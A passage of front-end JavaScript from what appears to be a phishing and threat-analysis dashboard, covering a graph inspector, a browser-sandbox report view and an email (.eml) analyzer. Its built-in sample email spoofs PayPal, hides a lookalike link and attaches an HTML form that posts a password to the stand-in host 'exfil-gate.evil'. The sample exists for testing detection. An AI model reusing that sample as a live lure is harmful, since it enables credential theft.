    if (!container) return;

    if (!node) {
        if (typeBadge) typeBadge.textContent = "Select Node";
        container.innerHTML = `<p>Click any domain, IP address, certificate, URL, hosting provider, or campaign node in the graph to inspect attributes and pivot relationships.</p>`;
        return;
    }

    const meta = GRAPH_TYPE_META[node.type] || { label: node.type };
    if (typeBadge) typeBadge.textContent = meta.label;

    const props = node.properties || {};
    const propEntries = Object.entries(props).filter(([k, v]) => (
        v !== null && v !== undefined && v !== "" && !(Array.isArray(v) && v.length === 0) && k !== "scan_ids"
    ));

    const propsHtml = propEntries.slice(0, 8).map(([k, v]) => {
        const valStr = Array.isArray(v) ? v.slice(0, 5).join(", ") : String(v);
        return `
            <div class="flex justify-between gap-2 py-1 border-b border-[#161f30]">
                <span class="text-slate-500 capitalize">${escapeHtml(k.replace(/_/g, " "))}</span>
                <span class="text-slate-200 mono text-right break-all max-w-[190px]">${escapeHtml(valStr)}</span>
            </div>
        `;
    }).join("");

    // Connected neighbors
    const connected = graphState.simEdges
        .filter(e => e.source === node.id || e.target === node.id)
        .map(e => {
            const isOut = e.source === node.id;
            const other = isOut ? e.tNode : e.sNode;
            return { edge: e, other, direction: isOut ? "->" : "<-" };
        });

    const neighborsHtml = connected.slice(0, 10).map(({ edge, other, direction }) => `
        <button type="button" data-jump-node="${escapeHtml(other.id)}" class="w-full text-left p-2 rounded-lg bg-[#0b0f17] hover:bg-[#131b2b] border border-[#1a2438] flex items-center justify-between gap-2 transition">
            <div class="min-w-0">
                <div class="text-[11px] text-slate-200 truncate font-medium">${escapeHtml(other.label)}</div>
                <div class="text-[10px] text-slate-500">${direction} ${escapeHtml(edge.label || edge.relation)}</div>
            </div>
            <span class="text-[10px] text-cyan-400 flex-shrink-0">Inspect</span>
        </button>
    `).join("");

    const actionScan = (node.type === "domain" || node.type === "url")
        ? `<button type="button" id="btn-inspector-scan" class="btn-primary text-[11px] py-1.5 px-3">Scan Target</button>`
        : "";
    const actionFilter = `<button type="button" id="btn-inspector-filter" class="btn-secondary text-[11px] py-1.5 px-3">Focus Query</button>`;

    container.innerHTML = `
        <div class="space-y-2">
            <div class="flex items-start justify-between gap-2">
                <div class="font-bold text-sm text-white break-all">${escapeHtml(node.label)}</div>
                ${node.score !== null && node.score !== undefined ? `<span class="px-2 py-0.5 rounded bg-[#141d2e] text-white mono text-[11px] font-bold flex-shrink-0">${Math.round(node.score)}/100</span>` : ""}
            </div>
            <div class="text-[11px] text-slate-400">
                Risk: <strong class="uppercase text-slate-200">${escapeHtml(node.risk_level)}</strong> · ${connected.length} relationship(s)
            </div>
            <div class="pt-1 flex flex-wrap gap-2">${actionScan}${actionFilter}</div>
        </div>
        ${propsHtml ? `<div class="pt-1 space-y-0.5 text-[11px]">${propsHtml}</div>` : ""}
        <div class="space-y-1.5 pt-1">
            <div class="text-[11px] font-semibold uppercase tracking-wider text-slate-400">Connected Entities (${connected.length})</div>
            <div class="space-y-1.5 max-h-44 overflow-y-auto pr-1">${neighborsHtml || '<p class="text-slate-500">No visible connections.</p>'}</div>
        </div>
    `;

    container.querySelectorAll("[data-jump-node]").forEach(btn => {
        btn.addEventListener("click", () => {
            const targetId = btn.getAttribute("data-jump-node");
            const targetNode = graphState.simNodeMap.get(targetId);
            if (targetNode) {
                graphState.selectedNodeId = targetId;
                focusCameraOnNodes([targetId]);
                renderNodeInspector(targetNode);
                renderGraphCanvas();
            }
        });
    });

    const scanBtn = document.getElementById("btn-inspector-scan");
    if (scanBtn) {
        scanBtn.addEventListener("click", () => {
            const targetVal = node.type === "url" ? (props.url || node.label) : (props.domain || node.label);
            scanDirect(targetVal);
        });
    }

    const filterBtn = document.getElementById("btn-inspector-filter");
    if (filterBtn) {
        filterBtn.addEventListener("click", () => {
            graphState.focusScanId = null;
            graphState.query = node.label;
            const sInput = document.getElementById("graph-search-input");
            if (sInput) sInput.value = node.label;
            loadThreatGraph();
        });
    }
}

// ===================================================================
// 11. Browser-Based Phishing Sandbox Controller
// ===================================================================
let currentSandboxReport = null;

function initBrowserSandbox() {
    const form = document.getElementById("sandbox-form");
    if (form) {
        form.addEventListener("submit", async (e) => {
            e.preventDefault();
            const url = (document.getElementById("sandbox-url-input")?.value || "").trim();
            if (!url) return;
            await executeSandboxRun(url);
        });
    }

    document.querySelectorAll(".quick-sandbox-ex").forEach(btn => {
        btn.addEventListener("click", (e) => {
            e.preventDefault();
            const input = document.getElementById("sandbox-url-input");
            if (input) {
                input.value = btn.dataset.url;
                executeSandboxRun(btn.dataset.url);
            }
        });
    });

    const reqFilter = document.getElementById("sbx-req-filter");
    if (reqFilter) {
        reqFilter.addEventListener("change", () => {
            if (currentSandboxReport) {
                renderSandboxRequests(currentSandboxReport);
            }
        });
    }

    const expandBtn = document.getElementById("btn-sbx-expand-shot");
    const shotImg = document.getElementById("sbx-screenshot-img");
    const openLightbox = () => {
        if (!currentSandboxReport?.screenshot_url) return;
        const modal = document.getElementById("modal-sandbox-shot");
        const mImg = document.getElementById("modal-sbx-shot-img");
        const mTitle = document.getElementById("modal-sbx-shot-title");
        if (mImg) mImg.src = currentSandboxReport.screenshot_url;
        if (mTitle) mTitle.textContent = `${currentSandboxReport.sandbox_id} · ${currentSandboxReport.final_url}`;
        if (modal) modal.classList.remove("hidden");
    };
    if (expandBtn) expandBtn.addEventListener("click", openLightbox);
    if (shotImg) shotImg.addEventListener("click", openLightbox);

    const shotModal = document.getElementById("modal-sandbox-shot");
    if (shotModal) {
        shotModal.addEventListener("click", (e) => {
            if (e.target === shotModal) shotModal.classList.add("hidden");
        });
    }
}

function runUrlInSandbox(url, scanId = null) {
    if (!url) return;
    switchTab("tab-sandbox");
    const input = document.getElementById("sandbox-url-input");
    if (input) input.value = url;
    executeSandboxRun(url, scanId);
}

async function executeSandboxRun(url, scanId = null) {
    const btn = document.getElementById("btn-sandbox-run");
    const loading = document.getElementById("sandbox-loading");
    const results = document.getElementById("sandbox-results");
    const waitVal = parseFloat(document.getElementById("sandbox-wait-select")?.value || "1.8");

    if (btn) {
        btn.disabled = true;
        btn.textContent = "Running Sandbox...";
    }
    if (loading) loading.classList.remove("hidden");
    if (results) results.classList.add("hidden");

    try {
        const resp = await fetch("/api/sandbox", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                url: url,
                wait_seconds: waitVal,
                scan_id: scanId,
            }),
        });
        if (!resp.ok) {
            const err = await resp.json().catch(() => ({}));
            alert("Sandbox failed: " + (err.detail || "Execution error"));
            return;
        }
        const data = await resp.json();
        currentSandboxReport = data;
        displaySandboxReport(data);
        loadSandboxHistory();
    } catch (e) {
        alert("Sandbox request failed: " + e.message);
    } finally {
        if (loading) loading.classList.add("hidden");
        if (btn) {
            btn.disabled = false;
            btn.innerHTML = `<span>Launch Sandbox</span>`;
        }
    }
}

function displaySandboxReport(data) {
    const panel = document.getElementById("sandbox-results");
    if (!panel) return;
    panel.classList.remove("hidden");
    panel.scrollIntoView({ behavior: "smooth" });

    const verdictEl = document.getElementById("sbx-verdict");
    const score = Math.round(data.sandbox_score || 0);
    if (verdictEl) {
        let cls = "bg-emerald-500/10 text-emerald-400 border-emerald-500/30";
        if (data.verdict === "MALICIOUS") cls = "bg-rose-500/10 text-rose-400 border-rose-500/30";
        else if (data.verdict === "HIGH_RISK") cls = "bg-orange-500/10 text-orange-400 border-orange-500/30";
        else if (data.verdict === "SUSPICIOUS") cls = "bg-amber-500/10 text-amber-400 border-amber-500/30";
        verdictEl.className = `px-3 py-0.5 rounded-full text-xs font-semibold border ${cls}`;
        verdictEl.textContent = data.verdict || "BENIGN";
    }

    document.getElementById("sbx-score-badge").textContent = `Score: ${score}/100`;
    document.getElementById("sbx-id").textContent = data.sandbox_id;
    const btnSbxMitre = document.getElementById("btn-sbx-mitre");
    if (btnSbxMitre) {
        btnSbxMitre.onclick = () => viewInMitre({ sandboxId: data.sandbox_id });
    }
    document.getElementById("sbx-worker-meta").textContent =
        `${data.browser_product || "Chromium"} · PID ${data.isolated_worker_pid || "?"} · ${data.execution_ms || 0}ms`;
    document.getElementById("sbx-title").textContent = data.page_title || data.final_domain || data.target_domain;
    document.getElementById("sbx-summary").textContent = data.summary || "";
    document.getElementById("sbx-frame-url").textContent = data.final_url || data.target_url;

    const tel = data.telemetry || {};
    document.getElementById("sbx-stat-reqs").textContent = tel.total_requests ?? (data.network_requests || []).length;
    document.getElementById("sbx-stat-3p").textContent = tel.third_party_requests ?? 0;
    document.getElementById("sbx-stat-redirects").textContent = (data.redirect_chain || []).length;
    document.getElementById("sbx-stat-forms").textContent = (data.form_destinations || []).length;
    document.getElementById("sbx-stat-scripts").textContent = (data.suspicious_scripts || []).length;
    document.getElementById("sbx-stat-blocked").textContent = tel.blocked_count ?? (data.blocked_requests || []).length;

    // Screenshot Preview
    const imgEl = document.getElementById("sbx-screenshot-img");
    const emptyEl = document.getElementById("sbx-screenshot-empty");
    if (data.screenshot_available && data.screenshot_url) {
        imgEl.src = `${data.screenshot_url}?t=${Date.now()}`;
        imgEl.classList.remove("hidden");
        emptyEl.classList.add("hidden");
    } else {
        imgEl.src = "";
        imgEl.classList.add("hidden");
        emptyEl.classList.remove("hidden");
    }

    // Redirect Chain
    const redirList = document.getElementById("sbx-redirects-list");
    redirList.innerHTML = "";
    const hops = data.redirect_chain || [];
    if (!hops.length) {
        redirList.innerHTML = `<p class="text-slate-500">No redirects recorded.</p>`;
    } else {
        hops.forEach(h => {
            const code = h.status_code || "--";
            const statusCls = code >= 300 && code < 400
                ? "bg-amber-500/15 text-amber-300 border-amber-500/30"
                : "bg-emerald-500/15 text-emerald-300 border-emerald-500/30";
            const xoBadge = h.is_cross_origin
                ? `<span class="px-1.5 py-0.2 rounded text-[10px] bg-rose-500/15 text-rose-300 border border-rose-500/30">Cross-Origin</span>`
                : "";
            const row = document.createElement("div");
            row.className = "p-2.5 rounded-lg bg-[#0b0f17] border border-[#1b2538] space-y-1";
            row.innerHTML = `
                <div class="flex items-center justify-between gap-2">
                    <span class="font-semibold text-slate-300">Hop #${escapeHtml(h.hop)}</span>
                    <div class="flex items-center gap-1.5">
                        ${xoBadge}
                        <span class="px-1.5 py-0.5 rounded text-[10px] font-bold mono border ${statusCls}">HTTP ${escapeHtml(code)}</span>
                    </div>
                </div>
                <div class="mono text-[11px] text-slate-200 break-all">${escapeHtml(h.url)}</div>
                ${h.remote_ip ? `<div class="text-[10px] text-slate-500 mono">Peer IP: ${escapeHtml(h.remote_ip)}</div>` : ""}
            `;
            redirList.appendChild(row);
        });
    }

    // Form Destinations & Runtime Exfil
    const formsList = document.getElementById("sbx-forms-list");
    formsList.innerHTML = "";
    const forms = data.form_destinations || [];
    const runtimeExfil = data.runtime_exfil_targets || [];
    if (!forms.length && !runtimeExfil.length) {
        formsList.innerHTML = `<p class="text-slate-500">No HTML forms or dynamic POST/beacon endpoints observed.</p>`;
    } else {
        forms.forEach(f => {
            const xo = f.is_cross_origin
                ? `<span class="px-1.5 py-0.5 rounded text-[10px] font-semibold bg-rose-500/15 text-rose-300 border border-rose-500/30">EXTERNAL POST</span>`
                : `<span class="px-1.5 py-0.5 rounded text-[10px] font-semibold bg-slate-500/15 text-slate-300 border border-slate-500/30">SAME-ORIGIN</span>`;
            const pwd = f.has_password_input
                ? `<span class="px-1.5 py-0.5 rounded text-[10px] bg-amber-500/15 text-amber-300 border border-amber-500/30">Password Input</span>`
                : "";
            const card = document.createElement("div");
            card.className = "p-2.5 rounded-lg bg-[#0b0f17] border border-[#1b2538] space-y-1";
            card.innerHTML = `
                <div class="flex items-center justify-between gap-2">
                    <span class="font-semibold text-white">Form #${escapeHtml(f.form_index)} · ${escapeHtml(f.method)}</span>
                    <div class="flex items-center gap-1">${pwd}${xo}</div>
                </div>
                <div class="mono text-[11px] text-cyan-300 break-all">${escapeHtml(f.action_url || f.action_raw)}</div>
                ${(f.input_names || []).length ? `<div class="text-[10px] text-slate-400">Fields: ${escapeHtml(f.input_names.join(", "))}</div>` : ""}
            `;
            formsList.appendChild(card);
        });

        runtimeExfil.forEach(rx => {
            const card = document.createElement("div");
            card.className = "p-2.5 rounded-lg bg-[#0b0f17] border border-rose-500/30 space-y-1";
            card.innerHTML = `
                <div class="flex items-center justify-between gap-2">
                    <span class="font-semibold text-rose-300">Runtime ${escapeHtml(rx.api)} (${escapeHtml(rx.method)})</span>
                    ${rx.is_cross_origin ? `<span class="px-1.5 py-0.5 rounded text-[10px] bg-rose-500/15 text-rose-300 border border-rose-500/30">Cross-Origin</span>` : ""}
                </div>
                <div class="mono text-[11px] text-slate-200 break-all">${escapeHtml(rx.url)}</div>
            `;
            formsList.appendChild(card);
        });
    }

    // Suspicious Scripts
    const scriptsList = document.getElementById("sbx-scripts-list");
    scriptsList.innerHTML = "";
    const scripts = data.suspicious_scripts || [];
    document.getElementById("sbx-scripts-meta").textContent =
        `${tel.parsed_scripts_count || 0} scripts parsed · ${tel.eval_calls_count || 0} runtime eval() · ${tel.event_hooks_count || 0} DOM hooks`;

    if (!scripts.length) {
        scriptsList.innerHTML = `<div class="col-span-2 p-3 rounded-xl bg-[#0b0f17] border border-[#1b2538] text-emerald-400">No obfuscated, anti-analysis, or suspicious scripts triggered during isolated execution.</div>`;
    } else {
        scripts.forEach(sc => {
            let sevCls = "bg-amber-500/15 text-amber-300 border-amber-500/30";
            if (sc.severity === "critical" || sc.severity === "high") sevCls = "bg-rose-500/15 text-rose-300 border-rose-500/30";
            const card = document.createElement("div");
            card.className = "p-3.5 rounded-xl bg-[#0b0f17] border border-[#1b2538] space-y-2";
            card.innerHTML = `
                <div class="flex items-center justify-between gap-2">
                    <span class="font-bold text-white mono text-[11px]">${escapeHtml(sc.script_id)} (${escapeHtml(sc.source_type)})</span>
                    <span class="px-2 py-0.5 rounded text-[10px] font-bold uppercase border ${sevCls}">${escapeHtml(sc.severity)}</span>
                </div>
                <ul class="space-y-1 text-slate-300">
                    ${(sc.reasons || []).map(r => `<li class="flex gap-1.5"><span class="text-rose-400">•</span><span>${escapeHtml(r)}</span></li>`).join("")}
                </ul>
                ${sc.snippet_preview ? `<pre class="p-2 rounded bg-[#070a11] border border-[#182235] text-[10px] text-slate-400 mono overflow-x-auto whitespace-pre-wrap break-all">${escapeHtml(sc.snippet_preview)}</pre>` : ""}
            `;
            scriptsList.appendChild(card);
        });
    }

    renderSandboxRequests(data);
}

function renderSandboxRequests(data) {
    const tbody = document.getElementById("sbx-requests-tbody");
    if (!tbody) return;
    tbody.innerHTML = "";

    const filterMode = document.getElementById("sbx-req-filter")?.value || "all";
    const merged = [...(data.blocked_requests || []), ...(data.network_requests || [])];
    const seen = new Set();
    const list = [];
    merged.forEach(r => {
        const key = `${r.request_id}|${r.url}`;
        if (!seen.has(key)) {
            seen.add(key);
            list.push(r);
        }
    });

    const filtered = list.filter(r => {
        if (filterMode === "third_party") return Boolean(r.is_third_party);
        if (filterMode === "blocked") return Boolean(r.blocked || r.failed);
        return true;
    });

    if (!filtered.length) {
        tbody.innerHTML = `<tr><td colspan="6" class="text-center py-5 text-slate-500">No network requests match the selected filter.</td></tr>`;
        return;
    }

    filtered.forEach(r => {
        const tr = document.createElement("tr");
        tr.className = "border-b border-[#1b2538] hover:bg-[#141b29] transition";
        const statusBadge = r.blocked
            ? `<span class="px-1.5 py-0.5 rounded text-[10px] font-bold bg-rose-500/20 text-rose-300 border border-rose-500/30">BLOCKED</span>`
            : (r.failed
                ? `<span class="text-amber-400 mono">FAILED</span>`
                : `<span class="text-emerald-400 mono">${escapeHtml(r.status_code ?? "--")}</span>`);
        const tpTag = r.is_third_party
            ? `<span class="ml-1 px-1 py-0.2 rounded text-[9px] bg-cyan-500/15 text-cyan-300">3P</span>`
            : "";

        tr.innerHTML = `
            <td class="py-2 px-3 mono text-slate-300">${escapeHtml(r.method || "GET")}</td>
            <td class="py-2 px-3">${statusBadge}</td>
            <td class="py-2 px-3 text-slate-400">${escapeHtml(r.resource_type || "Other")}</td>
            <td class="py-2 px-3 text-slate-200 mono">${escapeHtml(r.domain || "-")}${tpTag}</td>
            <td class="py-2 px-3 text-slate-400 mono">${escapeHtml(r.remote_ip || "-")}</td>
            <td class="py-2 px-3 text-slate-300 mono truncate max-w-sm" title="${escapeHtml(r.url)}">
                ${escapeHtml(r.blocked_reason ? `${r.blocked_reason} · ${r.url}` : r.url)}
            </td>
        `;
        tbody.appendChild(tr);
    });
}

async function loadSandboxHistory() {
    const tbody = document.getElementById("sandbox-history-tbody");
    if (!tbody) return;
    try {
        const resp = await fetch("/api/sandbox?limit=15");
        if (!resp.ok) return;
        const rows = await resp.json();
        tbody.innerHTML = "";
        if (!rows.length) {
            tbody.innerHTML = `<tr><td colspan="6" class="text-center py-5 text-slate-500">No isolated browser sandbox detonations yet.</td></tr>`;
            return;
        }
        rows.forEach(r => {
            let badgeCls = "bg-emerald-500/10 text-emerald-400 border-emerald-500/30";
            if (r.verdict === "MALICIOUS") badgeCls = "bg-rose-500/10 text-rose-400 border-rose-500/30";
            else if (r.verdict === "HIGH_RISK" || r.verdict === "SUSPICIOUS") badgeCls = "bg-amber-500/10 text-amber-400 border-amber-500/30";

            const tr = document.createElement("tr");
            tr.className = "border-b border-[#1b2538] hover:bg-[#141b29] transition";
            tr.innerHTML = `
                <td class="py-2.5 px-3 mono text-slate-400">${escapeHtml(r.sandbox_id)}</td>
                <td class="py-2.5 px-3 font-semibold text-white truncate max-w-xs">${escapeHtml(r.target_domain)}</td>
                <td class="py-2.5 px-3 text-center font-bold text-white">${Math.round(r.sandbox_score || 0)}</td>
                <td class="py-2.5 px-3 text-center"><span class="px-2 py-0.5 rounded text-[10px] font-semibold border ${badgeCls}">${escapeHtml(r.verdict)}</span></td>
                <td class="py-2.5 px-3 text-slate-400">${new Date(r.timestamp).toLocaleString()}</td>
                <td class="py-2.5 px-3 text-right">
                    <button onclick="inspectSandboxRun('${escapeHtml(r.sandbox_id)}')" class="text-emerald-400 hover:underline">Inspect</button>
                </td>
            `;
            tbody.appendChild(tr);
        });
    } catch (e) {
        console.error("Failed loading sandbox history:", e);
    }
}

async function inspectSandboxRun(sandboxId) {
    try {
        const resp = await fetch(`/api/sandbox/${encodeURIComponent(sandboxId)}`);
        if (!resp.ok) return;
        const data = await resp.json();
        currentSandboxReport = data;
        displaySandboxReport(data);
    } catch (e) {
        alert("Failed to load sandbox report: " + e.message);
    }
}

// ===================================================================
// 12. Email (.eml) Phishing & Isolated Attachment Analyzer
// ===================================================================
let selectedEmlFileName = "pasted_message.eml";

function initEmailAnalyzer() {
    const dropZone = document.getElementById("eml-drop-zone");
    const fileInput = document.getElementById("eml-file-input");
    const rawInput = document.getElementById("eml-raw-input");
    const statusEl = document.getElementById("eml-file-status");
    const form = document.getElementById("eml-form");
    const sampleBtn = document.getElementById("btn-eml-sample");

    const readSelectedFile = async (file) => {
        if (!file) return;
        selectedEmlFileName = file.name || "uploaded.eml";
        if (statusEl) statusEl.textContent = `Loaded '${selectedEmlFileName}' (${file.size} bytes) — submitting for analysis...`;
        const text = await file.text();
        if (rawInput) rawInput.value = text;
        await executeEmlAnalysis(selectedEmlFileName, text);
    };

    if (dropZone && fileInput) {
        dropZone.addEventListener("click", () => fileInput.click());
        fileInput.addEventListener("change", () => {
            if (fileInput.files && fileInput.files[0]) readSelectedFile(fileInput.files[0]);
        });
        dropZone.addEventListener("dragover", (e) => {
            e.preventDefault();
            dropZone.classList.add("dragover");
        });
        dropZone.addEventListener("dragleave", () => dropZone.classList.remove("dragover"));
        dropZone.addEventListener("drop", (e) => {
            e.preventDefault();
            dropZone.classList.remove("dragover");
            if (e.dataTransfer?.files && e.dataTransfer.files[0]) readSelectedFile(e.dataTransfer.files[0]);
        });
    }

    if (sampleBtn) {
        sampleBtn.addEventListener("click", () => {
            selectedEmlFileName = "sample_paypal_phish.eml";
            const sampleEml = [
                'From: "PayPal Security Center" <alerts@paypa1-support-verify.xyz>',
                'Reply-To: harvest@drop-collector-mail.xyz',
                'Return-Path: <bounce@mailer-relay.xyz>',
                'To: victim@corp.example',
                'Subject: Urgent: Your PayPal account access is suspended',
                'Date: Tue, 10 Nov 2026 06:15:00 +0000',
                'Message-ID: <918273645@mailer-relay.xyz>',
                'Authentication-Results: mx.corp.example; spf=fail (sender IP unauthorized); dkim=fail (bad sig); dmarc=fail (p=reject)',
                'Received: from unknown (HELO phish-kit-relay.xyz) ([198.51.100.77]) by mx.corp.example with ESMTP; Tue, 10 Nov 2026 06:15:00 +0000',
                'MIME-Version: 1.0',
                'Content-Type: multipart/mixed; boundary="PP-BOUNDARY-123"',
                '',
                '--PP-BOUNDARY-123',
                'Content-Type: text/html; charset="utf-8"',
                '',
                '<html><body><p>Dear Customer, confirm immediately: <a href="http://paypa1-security-verification.xyz/login">https://www.paypal.com/signin</a></p></body></html>',
                '',
                '--PP-BOUNDARY-123',
                'Content-Type: text/html; name="invoice_login.html"',
                'Content-Disposition: attachment; filename="invoice_login.html"',
                '',
                '<html><body><form action="https://exfil-gate.evil/post" method="POST"><input type="password" name="password"></form><script>const b=URL.createObjectURL(new Blob([atob("dGVzdA==")]));</script></body></html>',
                '--PP-BOUNDARY-123--',
            ].join("\r\n");
            if (rawInput) rawInput.value = sampleEml;
            if (statusEl) statusEl.textContent = "Loaded sample_paypal_phish.eml — ready to inspect.";
            executeEmlAnalysis(selectedEmlFileName, sampleEml);
        });
    }

    if (form) {
        form.addEventListener("submit", async (e) => {
            e.preventDefault();
            const content = (rawInput?.value || "").trim();
            if (!content) {
                alert("Please select a .eml file or paste raw email source.");
                return;
            }
            await executeEmlAnalysis(selectedEmlFileName, content);
        });
    }
}

async function executeEmlAnalysis(filename, emlContent) {
    const btn = document.getElementById("btn-eml-analyze");
    const loading = document.getElementById("eml-loading");
    const results = document.getElementById("eml-results");
    const verifyDns = document.getElementById("eml-verify-dns")?.checked ?? true;

    if (btn) {
        btn.disabled = true;
        btn.textContent = "Analyzing...";
    }
    if (loading) loading.classList.remove("hidden");
    if (results) results.classList.add("hidden");

    try {
        const resp = await fetch("/api/email/analyze", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                filename: filename || "message.eml",
                eml_content: emlContent,
                verify_dns: verifyDns,
            }),
        });
        if (!resp.ok) {
            const err = await resp.json().catch(() => ({}));
            alert("Email analysis failed: " + (err.detail || "Server error"));
            return;
        }
        const data = await resp.json();
        displayEmailReport(data);
        loadEmailHistory();
    } catch (e) {
        alert("Email analysis error: " + e.message);
    } finally {
        if (loading) loading.classList.add("hidden");
        if (btn) {
            btn.disabled = false;
            btn.textContent = "Analyze Email (.eml)";
        }
    }
}

function setAuthPill(badgeId, statusStr) {
    const badge = document.getElementById(badgeId);
    if (!badge) return;
    const low = (statusStr || "").toLowerCase();
    if (low.startsWith("pass")) {
        badge.className = "px-2 py-0.5 rounded text-[10px] font-bold uppercase border bg-emerald-500/15 text-emerald-300 border-emerald-500/30";
        badge.textContent = "PASS";
    } else if (low.includes("fail")) {
        badge.className = "px-2 py-0.5 rounded text-[10px] font-bold uppercase border bg-rose-500/15 text-rose-300 border-rose-500/30";
        badge.textContent = "FAIL";
    } else {
        badge.className = "px-2 py-0.5 rounded text-[10px] font-bold uppercase border bg-amber-500/15 text-amber-300 border-amber-500/30";
        badge.textContent = "WARN";
    }
}

function displayEmailReport(data) {
    const panel = document.getElementById("eml-results");
    if (!panel) return;
    panel.classList.remove("hidden");
    panel.scrollIntoView({ behavior: "smooth" });

    const verdictEl = document.getElementById("eml-verdict");
    let vCls = "bg-emerald-500/10 text-emerald-400 border-emerald-500/30";
    if (data.verdict === "MALICIOUS") vCls = "bg-rose-500/10 text-rose-400 border-rose-500/30";
    else if (data.verdict === "HIGH_RISK" || data.verdict === "SUSPICIOUS") vCls = "bg-amber-500/10 text-amber-400 border-amber-500/30";
    verdictEl.className = `px-3 py-0.5 rounded-full text-xs font-semibold border ${vCls}`;
    verdictEl.textContent = data.verdict;

    document.getElementById("eml-score-badge").textContent = `Score: ${Math.round(data.overall_score || 0)}/100`;
    document.getElementById("eml-id").textContent = data.email_id;
    const btnEmlMitre = document.getElementById("btn-eml-mitre");
    if (btnEmlMitre) {
        btnEmlMitre.onclick = () => viewInMitre({ emailId: data.email_id });
    }
    document.getElementById("eml-filename-badge").textContent = data.filename || "message.eml";
    document.getElementById("eml-subject").textContent = data.subject || "(No Subject)";
    document.getElementById("eml-summary").textContent = data.summary || "";
    document.getElementById("eml-meta-line").textContent =
        `Date: ${data.date_header || "N/A"} · Message-ID: ${data.message_id || "Missing"}`;

    // Auth Cards
    const auth = data.authentication || {};
    setAuthPill("eml-spf-badge", auth.spf_status);
    document.getElementById("eml-spf-status").textContent = auth.spf_status || "Unknown";
    document.getElementById("eml-spf-detail").textContent = auth.spf_record || `Domain: ${auth.spf_domain || "N/A"}`;

    setAuthPill("eml-dkim-badge", auth.dkim_status);
    document.getElementById("eml-dkim-status").textContent = auth.dkim_status || "Unknown";
    document.getElementById("eml-dkim-detail").textContent =
        `Selector: ${auth.dkim_selector || "N/A"} · Domain: ${auth.dkim_domain || "N/A"}`;

    setAuthPill("eml-dmarc-badge", auth.dmarc_status);
    document.getElementById("eml-dmarc-status").textContent = auth.dmarc_status || "Unknown";
    document.getElementById("eml-dmarc-detail").textContent = auth.dmarc_record || `Org Domain: ${auth.dmarc_domain || "N/A"}`;

    // Sender Spoofing
    const snd = data.sender || {};
    const spoofBadge = document.getElementById("eml-spoof-badge");
    if (snd.spoofing_detected) {
        spoofBadge.className = "px-2 py-0.5 rounded text-[10px] font-bold uppercase bg-rose-500/20 text-rose-300 border border-rose-500/30";
        spoofBadge.textContent = "Spoofing Detected";
    } else {
        spoofBadge.className = "px-2 py-0.5 rounded text-[10px] font-bold uppercase bg-emerald-500/15 text-emerald-300 border border-emerald-500/30";
        spoofBadge.textContent = "Verified";
    }
    document.getElementById("eml-from-val").textContent =
        snd.from_display ? `${snd.from_display} <${snd.from_address}>` : (snd.from_address || "-");
    document.getElementById("eml-replyto-val").textContent = snd.reply_to_address || "Same as From";
    document.getElementById("eml-retpath-val").textContent = snd.return_path_address || "Not specified";
    document.getElementById("eml-brand-val").textContent = snd.impersonated_brand || "None";

    const spoofList = document.getElementById("eml-spoof-list");
    spoofList.innerHTML = (snd.indicators || []).length
        ? snd.indicators.map(i => `<li class="flex gap-1.5"><span class="text-rose-400">•</span><span>${escapeHtml(i)}</span></li>`).join("")
        : `<li class="text-emerald-400">No sender spoofing discrepancies found.</li>`;

    // Anomalies & Received Hops
    const anomList = document.getElementById("eml-anomalies-list");
    anomList.innerHTML = (data.header_anomalies || []).length
        ? data.header_anomalies.map(a => `<li class="flex gap-1.5"><span class="text-amber-400">•</span><span>${escapeHtml(a)}</span></li>`).join("")
        : `<li class="text-emerald-400">No structural email header anomalies flagged.</li>`;

    const hopsTbody = document.getElementById("eml-hops-tbody");
    hopsTbody.innerHTML = (data.received_hops || []).length
        ? data.received_hops.map(h => `
            <tr class="border-b border-[#161f30]">
                <td class="py-1.5 pr-2 text-slate-400 mono">#${escapeHtml(h.hop)}</td>
                <td class="py-1.5 pr-2 text-slate-200 mono">${escapeHtml(h.from_host || "?")} -> ${escapeHtml(h.by_host || "?")}</td>
                <td class="py-1.5 text-cyan-300 mono">${escapeHtml(h.ip || "-")}</td>
            </tr>
        `).join("")
        : `<tr><td colspan="3" class="py-2 text-slate-500">No Received hops present.</td></tr>`;

    // Embedded URLs
    const urlsTbody = document.getElementById("eml-urls-tbody");
    urlsTbody.innerHTML = "";
    const urls = data.embedded_urls || [];
    if (!urls.length) {
        urlsTbody.innerHTML = `<tr><td colspan="5" class="py-4 text-center text-slate-500">No HTTP/HTTPS URLs extracted from message body or attachments.</td></tr>`;
    } else {
        urls.forEach(u => {
            const tr = document.createElement("tr");
            tr.className = "border-b border-[#1b2538] hover:bg-[#141b29]";
            const mismatchBadge = u.anchor_mismatch
                ? `<span class="ml-1 px-1.5 py-0.2 rounded text-[10px] bg-rose-500/20 text-rose-300 border border-rose-500/30">MISMATCH</span>`
                : "";
            const scoreCls = u.score >= 50 ? "text-rose-400" : (u.score >= 25 ? "text-amber-300" : "text-emerald-400");
            tr.innerHTML = `
                <td class="py-2.5 px-3 mono text-slate-200 break-all max-w-xs">${escapeHtml(u.url)}</td>
                <td class="py-2.5 px-3 text-slate-300 max-w-xs">${escapeHtml(u.anchor_text || "-")}${mismatchBadge}</td>
                <td class="py-2.5 px-3 text-center font-bold mono ${scoreCls}">${Math.round(u.score)}</td>
                <td class="py-2.5 px-3 text-slate-400 text-[11px]">${escapeHtml((u.flags || []).slice(0, 2).join(" · ") || "Clean")}</td>
                <td class="py-2.5 px-3 text-right space-x-2 whitespace-nowrap">
                    <button onclick="scanDirect('${escapeHtml(u.url)}')" class="text-blue-400 hover:underline">Scan</button>
                    <button onclick="runUrlInSandbox('${escapeHtml(u.url)}')" class="text-emerald-400 hover:underline">Sandbox</button>
                </td>
            `;
            urlsTbody.appendChild(tr);
        });
    }

    // Attachments
    const attWrap = document.getElementById("eml-attachments-list");
    const attPidBadge = document.getElementById("eml-att-worker-badge");
    if (attPidBadge) {
        attPidBadge.textContent = data.isolated_worker_pid
            ? `Isolated Worker PID ${data.isolated_worker_pid}`
            : "Offline Subprocess (No Attachments)";
    }
    const atts = data.attachments || [];
    attWrap.innerHTML = "";
    if (!atts.length) {
        attWrap.innerHTML = `<p class="text-slate-500">No file attachments included in this message.</p>`;
    } else {
        atts.forEach(a => {
            let sevCls = "bg-emerald-500/10 text-emerald-300 border-emerald-500/30";
            if (a.verdict === "MALICIOUS" || a.verdict === "HIGH_RISK") sevCls = "bg-rose-500/15 text-rose-300 border-rose-500/30";
